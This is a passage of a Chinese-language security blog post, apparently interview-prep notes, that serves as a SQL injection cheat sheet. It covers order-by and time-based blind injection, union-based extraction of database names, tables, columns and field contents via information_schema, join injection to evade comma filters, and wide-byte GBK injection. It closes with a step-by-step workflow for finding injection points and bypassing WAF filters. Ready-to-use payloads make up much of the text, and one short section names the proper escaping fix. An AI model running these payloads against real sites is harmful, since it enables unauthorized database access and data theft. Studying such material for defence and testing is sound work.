+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by &#x27;number&#x27; (asc/desc)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>即对某一列进行排序，<strong>默认是升序排列</strong>，即后面默认跟上asc，那么上面一句就相当于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by 3 asc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们在注入时经常会使用order by来判断数据库的列数，那我们这里使用他配合union select来进行注入</p>
+<p>2、原理分析</p>
+<p>首先正常的注入是蓝色那部分的字符串，这里我们的目的是要注出test用户的user_pass值<br><img src="t01c82b98f9bd65effc.png" alt="img"><strong>接着我们在语句后面加上order by 3，即对第三列进行升序排列(按照ascii码表)</strong></p>
+<p><img src="t01c161fc6c34cd8fde.png" alt="img">这里的user_pass列中的3是我们union select里面的第三列，这里就把<code>3</code>替换为<code>a</code><br><img src="t0101ef42a1afcf0ae7.png" alt="img">这里可能看不出什么变化，那么把他改成<code>b</code>看看<br><img src="t014e91c51e99d488d7.png" alt="img">看到用户test跑到第一行来了，所以这里经常用来判断有返回差异的注入，且返回只有一列的输出，根据差异来判断我们盲注的值是否正确</p>
+<p>当然这里也可以使用order by desc降序排列来注入，所以这里要根据使用场景来进行选择</p>
+<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.0.21/yanci.php?username=root&#x27; and sleep(5)%23</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.0.21/yanci.php?username=root&#x27; and sleep(5) and &#x27;xRsl&#x27;=&#x27;xRsl#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.0.21/yanci.php?username=root&#x27; and If(ascii(substr(database(),1,1))=114,1,sleep(5))#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>盲注一般用脚本跑</p>
+<h3 id="联合查询的注入-（字符型和数字型，搜索型注入）"><a href="#联合查询的注入-（字符型和数字型，搜索型注入）" class="headerlink" title="联合查询的注入 （字符型和数字型，搜索型注入）"></a>联合查询的注入 （字符型和数字型，搜索型注入）</h3><p>数字型： SELECT 列 FROM 表 WHERE 数字型列=值</p>
+<p>字符型： SELECT 列 FROM 表 WHERE 字符型列=’值’</p>
+<p>搜索型： SELECT * FROM 表 WHERE where 被搜索的列 like ‘%值%</p>
+<p>字符型常常要考虑到单引号的闭合问题，</p>
+<p>输入1’order by 1#，页面正常，然后输入1’order by 2#，依次增加，直到3时出现错误，说明当前表有两列  ‘union select 1,2#      </p>
+<p>利用内置函数暴出用户名 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,user()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用内置函数暴出数据库版本 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,version()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用内置函数暴出数据库名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,database()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>暴出表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,table_name from information_schema.tables where table_schema=database()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>暴出字段名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x64617461（必须是表名的十六进制表示）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>暴出字段内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,    字段名 from 表名。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>报出第一个表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(select table_name from information_schema.tables where table_schema=database() limit 0,1 )    改变0 即可查看其他表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">group_concat(select table_name from information_schema.tables where table_schema=database())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>查询单个表</p>
+<p><img src="1554128693639.png" alt="1554128693639"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">concat(select table_name from information_schema.tables where table_schema=database()) limit 0,1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>报出所有表明</p>
+<p><img src="1554128418032.png" alt="1554128418032"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27;  union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 and &#x27;%&#x27;=&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="搜索型注入-判断"><a href="#搜索型注入-判断" class="headerlink" title="搜索型注入 判断"></a>搜索型注入 判断</h4><p>一般都用 like’%%’进行模糊查询</p>
+<p>​    ‘and 1=1 and ‘%’=’</p>
+<p>%’ and 1=1–’</p>
+<p>%’ and 1=1 and ‘%’=’</p>
+<h2 id="join注入"><a href="#join注入" class="headerlink" title="join注入"></a>join注入</h2><p><strong>payload：</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select * from (select 1) a join (select 2) b %23</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>优势：过滤了逗号的情况下使用</p>
+<p>下面的payload(别的博客处摘抄来的)适用于过滤了逗号和字段名的情况下使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">union all</span><br><span class="line">select * from(</span><br><span class="line">    (select 1)a join(</span><br><span class="line">        select F.[需要查询的字段号] from(</span><br><span class="line">            select * from [需要查询的表有多少个字段就join多少个]</span><br><span class="line">            union</span><br><span class="line">            select * from [需要查询的表] [limit子句]</span><br><span class="line">        )F-- 我们创建的虚拟表没有表名，因此定义一个别名，然后直接[别名].[字段号]查询数据</span><br><span class="line">    )b-- 同上[还差多少字段就再join多少个，以满足字段数相同的原则]</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="带-的注入"><a href="#带-的注入" class="headerlink" title="带!的注入"></a>带<code>!</code>的注入</h2><p><strong>直接看下面的payload，适用于and、or、^被过滤的情况下使用，有时候可能也会使用到，但是具体的原理不是很明白，大家可以自行google</strong><img src="1554130494912.png" alt="1554130494912"></p>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>在GBK编码时，mysql会认为两个字符是一个汉字（在前一个字节的ascii码大于128的情况下）。而经过转义之后的单引号’会变为\’，即%5c%27。构造id=1%df%27%23  (id=1%df’   sql  %23 )</p>
+<p>对于宽字节编码，有一种最好的修补就是：</p>
+<p>（1）使用mysql_set_charset(GBK)指定字符集</p>
+<p>（2）使用mysql_real_escape_string进行转义</p>
+<p>原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面e5和5c拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢？</p>
+<p>就是使用mysql_set_charset进行指定。</p>
+<p>上述的两个条件是“与”运算的关系，少一条都不行。</p>
+<p>测试;</p>
+<p><img src="20180725163629473.png" alt="img"><br>输出：</p>
+<p><img src="2018072516363889.png" alt="img"><br>效果很明显。</p>
+<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h1><p>如果我们这里的limit被过滤了咋办？那就试试下面的几种方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(1) group_concat(使用的最多)</span><br><span class="line">(2) &lt;&gt;筛选(不等于)</span><br><span class="line">(3) not in</span><br><span class="line">(4) DISTINCT</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="总结的注入流程"><a href="#总结的注入流程" class="headerlink" title="总结的注入流程"></a>总结的注入流程</h2><p>1、先找到注入点，id=，username=，判断GET/POST/COOKIE注入</p>
+<p>2、查看显示位，如果只有一个显示位在使用union注入是注意使用limit来限制显示</p>
+<p>3、判断字符型注入还是数字型注入（2-1，’是否正常）</p>
+<p>4、输入不同值查看页面是否有变化，无变化的话可以考虑采用bool时间盲注，若有报错信息优先考虑报错注入（exp，updatexml（优先采用updatexml、extractvalue报错））</p>
+<p>5、先简单测试空格和注释符是否被替换了，id=1 1，id = 1%231（看看能否用/ /、%20、%0a、%09绕过）</p>
+<p>6、进行fuzz，看看那些被waf了</p>
+<p>7、若页面上没有显示waf过滤之类的提示（sql injection detected），就测试是否有被替换为空的字符（如：’ or ‘*’=’、’ or ‘-‘=’ ，如果页面返回正常的话，则说明该字符被替换为空）</p>
+<p>8、简单尝试双写、编码、大小写替换的方法，判断是否可以绕过</p>
+<p>9、确定注入方式（尽量把盲注放最后），union、报错注入、盲注</p>
+<p>10、先在bp中跑一遍看是否有结果</p>
+<p>11、尝试写脚本</p>
+<p>最重要的两步就是注入点并判断出注入类型，找到被过滤的函数和关键字并找到替代的函数和关键字，这就需要我们靠自己的耐心和细心还有经验的积累了</p>
+<p>感谢博主 ：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/160584#h2-11">https://www.anquanke.com/post/id/160584#h2-11</a> </p>
+<h1 id="SQL注入的一些绕过"><a href="#SQL注入的一些绕过" class="headerlink" title="SQL注入的一些绕过"></a>SQL注入的一些绕过</h1>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/interview/" rel="tag"># interview</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/03/28/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/" rel="prev" title="网站搭建">
+      <i class="fa fa-chevron-left"></i> 网站搭建
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/04/22/sqlmap/" rel="next" title="sqlmap">
+      sqlmap <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF"><span class="nav-number">1.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Csrf"><span class="nav-number">2.</span> <span class="nav-text">Csrf</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Sqlmap"><span class="nav-number">3.</span> <span class="nav-text">Sqlmap</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">域名收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E5%85%B6%E7%9C%9F%E5%AE%9Eip"><span class="nav-number">5.</span> <span class="nav-text">查找其真实ip</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">6.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="nav-number">6.1.</span> <span class="nav-text">判断数据库类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Ebool%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">6.2.</span> <span class="nav-text">基于bool的盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E7%9A%84%E7%9B%B2%E6%B3%A8-regexp%E6%B3%A8%E5%85%A5"><span class="nav-number">6.3.</span> <span class="nav-text">正则匹配的盲注  **regexp注入  **</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E8%BF%87%E6%BB%A4%E4%BA%86-%E3%80%81in%E3%80%81like"><span class="nav-number">6.4.</span> <span class="nav-text">使用场景过滤了&#x3D;、in、like</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#order-by%E7%9B%B2%E6%B3%A8"><span class="nav-number">6.5.</span> <span class="nav-text">order by盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5payload"><span class="nav-number">6.5.1.</span> <span class="nav-text">1、基本注入payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">6.6.</span> <span class="nav-text">基于时间的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%9A%84%E6%B3%A8%E5%85%A5-%EF%BC%88%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%EF%BC%8C%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number">6.6.1.</span> <span class="nav-text">联合查询的注入 （字符型和数字型，搜索型注入）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5-%E5%88%A4%E6%96%AD"><span class="nav-number">6.6.1.1.</span> <span class="nav-text">搜索型注入 判断</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#join%E6%B3%A8%E5%85%A5"><span class="nav-number">6.7.</span> <span class="nav-text">join注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%A6-%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">6.8.</span> <span class="nav-text">带!的注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">6.9.</span> <span class="nav-text">宽字节注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tips"><span class="nav-number">7.</span> <span class="nav-text">Tips:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="nav-number">7.1.</span> <span class="nav-text">总结的注入流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87"><span class="nav-number">8.</span> <span class="nav-text">SQL注入的一些绕过</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Erlee"
+      src="/images/erlee.png">
+  <p class="site-author-name" itemprop="name">Erlee</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">豫ICP备 19040334号-1 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Erlee</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
